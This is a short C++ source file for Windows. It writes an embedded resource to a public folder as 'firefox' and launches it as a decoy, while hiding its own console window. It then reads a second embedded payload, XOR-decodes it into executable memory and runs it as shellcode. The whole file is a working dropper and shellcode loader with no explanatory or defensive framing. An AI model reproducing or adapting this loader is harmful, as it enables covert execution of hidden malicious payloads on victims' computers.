#include <iostream>
#include <Windows.h>
#include <thread>
#include "resource2.h"
#include "resource3.h"
#define filename1 "c:\\Users\\Public\\file"

#define filename2 "c:\\Users\\Public\\firefox"

using namespace std;
void firefox() {

	DWORD num=0;
	HRSRC hRes = FindResource( 0, L"#103", L"STRING" );
HGLOBAL hData = LoadResource( 0, hRes );
LPVOID data = LockResource( hData );
DWORD size = SizeofResource(0, hRes);
  
HANDLE hFile3 = CreateFileA(filename2,(GENERIC_READ | GENERIC_WRITE), (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, 1, FILE_ATTRIBUTE_NORMAL, NULL);
int ret=WriteFile(hFile3,data,size,&num,NULL);
CloseHandle(hFile3);



STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	if (!
	CreateProcess
			(

			TEXT(filename2),
			NULL,NULL,NULL,FALSE,
			CREATE_NEW_CONSOLE,
			NULL,NULL,
			&si,
			&pi
			)
			)
		{
			cout << "Unable to execute.";
		}}


using namespace std;
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
int main()
{

	DWORD num=0;
	HRSRC hRes = FindResource( 0, L"#101", L"STRING" );
HGLOBAL hData = LoadResource( 0, hRes );
LPVOID data = LockResource( hData );
DWORD size = SizeofResource(0, hRes);
  
HANDLE hFile3 = CreateFileA(filename1,(GENERIC_READ | GENERIC_WRITE), (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, 1, FILE_ATTRIBUTE_NORMAL, NULL);
int ret=WriteFile(hFile3,data,size,&num,NULL);
CloseHandle(hFile3);


//int result = system(filename1);	


	thread t(firefox);
	

//cout<<result;

  //text[size] = 0;
  //FreeResource(hMem)
	HANDLE hFile2 = CreateFileA(filename1,(GENERIC_READ | GENERIC_WRITE), (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	int size2= GetFileSize(
    hFile2,
  NULL
);
	cout<<"in";
	//BYTE *buffer=(BYTE *)malloc(size2);

	
    VOID *data2=VirtualAlloc(
                     NULL, // Next page to commit
                     size2,         // Page size, in bytes
                     MEM_COMMIT,         // Allocate a committed page
					 0x40);    // Read/write access
    if (data2 == NULL )
    {
       cout<<"VirtualAlloc failed.\n";
	}

	 ret=ReadFile(hFile2, data2, size2,&num, NULL);
	 char *i=(char *)data2;
	 for (int t=0;t<size2;t++)
		i[t]^=0xa5;

//__asm{
	//jmp P;
	//};
	//memcpy(data2, buffer, size2);
	cout<<"in";
	int (*func)();
  func = (int (*)()) data2;
  (int)(*func)();
  t.join();
}
